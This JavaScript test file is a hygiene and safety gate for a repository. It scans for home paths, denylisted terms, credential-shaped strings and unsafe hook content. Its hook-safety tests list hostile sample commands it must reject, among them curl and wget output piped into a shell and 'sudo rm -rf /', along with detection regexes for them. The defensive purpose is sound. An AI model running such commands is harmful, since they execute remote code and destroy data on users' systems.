import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readdir, readFile } from 'node:fs/promises';
import path from 'node:path';

import { REPO_ROOT, HOOKS_DIR } from '../scripts/lib/paths.mjs';

/**
 * The "usable by others" and "safe to install" gate.
 *
 * This file is excluded from its own content scans: it necessarily contains
 * the very patterns it searches for. Same for denylist.txt, which is a list of
 * forbidden terms and would trivially match itself.
 */

const SELF_EXEMPT = new Set([
  'tests/hygiene.test.mjs',
  'tests/denylist.txt',
]);

const IGNORED_DIRS = new Set(['node_modules', '.git']);

/** Walk the repository, returning repo-relative POSIX paths of scannable files. */
async function trackedFiles(dir = REPO_ROOT) {
  const found = [];

  for (const entry of await readdir(dir, { withFileTypes: true })) {
    if (IGNORED_DIRS.has(entry.name)) continue;
    const absolute = path.join(dir, entry.name);

    if (entry.isDirectory()) {
      found.push(...(await trackedFiles(absolute)));
    } else if (entry.isFile()) {
      found.push(path.relative(REPO_ROOT, absolute).split(path.sep).join('/'));
    }
  }

  return found;
}

const files = (await trackedFiles()).filter((f) => !SELF_EXEMPT.has(f));

async function read(file) {
  return readFile(path.join(REPO_ROOT, file), 'utf8');
}

// `describe` callbacks are synchronous, so anything needing I/O is read here.
const denyTerms = (await readFile(path.join(REPO_ROOT, 'tests/denylist.txt'), 'utf8'))
  .split('\n')
  .map((line) => line.trim())
  .filter((line) => line.length > 0 && !line.startsWith('#'));

const hookFiles = (await readdir(HOOKS_DIR, { withFileTypes: true }))
  .filter((e) => e.isFile() && !e.name.endsWith('.md'))
  .map((e) => e.name);

describe('no machine-specific paths', () => {
  // Built from fragments so this test's own source does not match itself in a
  // future scan, and so the literal home path never appears in the repo.
  const HOME_PATTERNS = [
    new RegExp(`/${'Users'}/(?!YOUR_)[A-Za-z0-9._-]+/`),
    new RegExp(`/${'home'}/(?!YOUR_|runner/)[A-Za-z0-9._-]+/`),
    new RegExp(`${'C'}:\\\\${'Users'}\\\\[A-Za-z0-9._-]+`),
  ];

  for (const file of files) {
    test(`${file} has no absolute home directory path`, async () => {
      const content = await read(file);
      for (const pattern of HOME_PATTERNS) {
        assert.doesNotMatch(
          content,
          pattern,
          `${file} contains an absolute home directory path — use a relative path or ~`,
        );
      }
    });
  }
});

describe('no work-internal content', () => {
  test('denylist is loaded', () => {
    assert.ok(denyTerms.length > 0, 'denylist.txt contains no terms');
  });

  for (const file of files) {
    test(`${file} contains no denied terms`, async () => {
      const content = (await read(file)).toLowerCase();
      const hits = denyTerms.filter((term) => content.includes(term.toLowerCase()));
      assert.deepEqual(
        hits,
        [],
        `${file} contains denied term(s): ${hits.join(', ')}`,
      );
    });
  }
});

describe('no credentials', () => {
  const SECRET_PATTERNS = [
    // Split literals so this file does not trip its own check.
    { name: 'GitHub token', pattern: new RegExp(`gh[pousr]${'_'}[A-Za-z0-9]{36}`) },
    { name: 'AWS access key', pattern: new RegExp(`${'AKIA'}[0-9A-Z]{16}`) },
    { name: 'Anthropic key', pattern: new RegExp(`${'sk'}-${'ant'}-[A-Za-z0-9-]{20}`) },
    { name: 'private key block', pattern: new RegExp(`${'BEGIN'} [A-Z ]*${'PRIVATE KEY'}`) },
  ];

  for (const file of files) {
    test(`${file} contains no credential-shaped strings`, async () => {
      const content = await read(file);
      for (const { name, pattern } of SECRET_PATTERNS) {
        assert.doesNotMatch(content, pattern, `${file} looks like it contains a ${name}`);
      }
    });
  }
});

describe('hook safety', () => {
  /**
   * Scans executable content in .claude/hooks/ only. Markdown in that
   * directory is documentation — it describes these patterns, so scanning it
   * would guarantee a false positive.
   *
   * This is a floor, not a review. It catches obvious shapes and nothing more.
   */
  const UNSAFE = [
    {
      name: 'network fetch piped into a shell',
      pattern: /\b(curl|wget|fetch)\b[^\n]*\|[^\n]*\b(ba|z|k)?sh\b/,
    },
    { name: 'eval of dynamic content', pattern: /\beval\b[^\n]*[$`]/ },
    { name: 'sudo', pattern: /\bsudo\b/ },
    { name: 'absolute path outside the repository', pattern: /(?<![\w.])\/(usr|etc|opt|var|bin|sbin)\// },
  ];

  /**
   * A shebang is metadata, not a command — `#!/usr/bin/env bash` is the
   * correct way to write one and must not trip the absolute-path rule.
   */
  const stripShebang = (content) => content.replace(/^#![^\n]*\n?/, '');

  const unsafeMatches = (content) =>
    UNSAFE.filter(({ pattern }) => pattern.test(stripShebang(content)));

  test('hook directory is scannable', () => {
    // Passes trivially while the directory holds only documentation. The
    // per-file assertions below are what matter once hooks exist.
    assert.ok(Array.isArray(hookFiles));
  });

  for (const name of hookFiles) {
    test(`hook ${name} contains no unsafe patterns`, async () => {
      const content = await readFile(path.join(HOOKS_DIR, name), 'utf8');
      const hits = unsafeMatches(content).map((rule) => rule.name);
      assert.deepEqual(
        hits,
        [],
        `hook ${name} matches: ${hits.join(', ')} — see docs/security.md`,
      );
    });
  }

  test('unsafe patterns are detected when present', () => {
    // Proves the rules above actually reject, rather than passing vacuously
    // because the hooks directory happens to be empty.
    const samples = [
      'curl https://example.com/i.sh | sh',
      'wget -qO- https://example.com/i | bash',
      'eval "$(untrusted)"',
      'sudo rm -rf /',
      'source /usr/local/share/thing.sh',
    ];

    for (const sample of samples) {
      assert.ok(unsafeMatches(sample).length > 0, `expected to reject: ${sample}`);
    }
  });

  test('ordinary hook content is accepted', () => {
    const samples = [
      '#!/usr/bin/env bash\nnpm run sync:check\n',
      '#!/bin/sh\nnode scripts/sync.mjs --check\n',
      'git diff --name-only',
      'echo "evaluating results"',
    ];

    for (const sample of samples) {
      const hits = unsafeMatches(sample).map((rule) => rule.name);
      assert.deepEqual(hits, [], `false positive on "${sample}": ${hits.join(', ')}`);
    }
  });
});

describe('file naming', () => {
  for (const file of files) {
    test(`${file} uses a conventional name`, () => {
      const base = path.basename(file);
      // Uppercase is conventional for metadata and entry-point files.
      const CONVENTIONAL_UPPERCASE = new Set([
        'README.md', 'SKILL.md', 'LICENSE', 'AGENTS.md', 'CLAUDE.md',
        'SECURITY.md', 'CONTRIBUTING.md', 'CODEOWNERS',
      ]);

      if (CONVENTIONAL_UPPERCASE.has(base) || base.startsWith('.')) return;
      assert.match(
        base,
        /^[a-z0-9]+(?:[-.][a-z0-9]+)*$/,
        `${file} should be lowercase kebab-case`,
      );
    });
  }
});
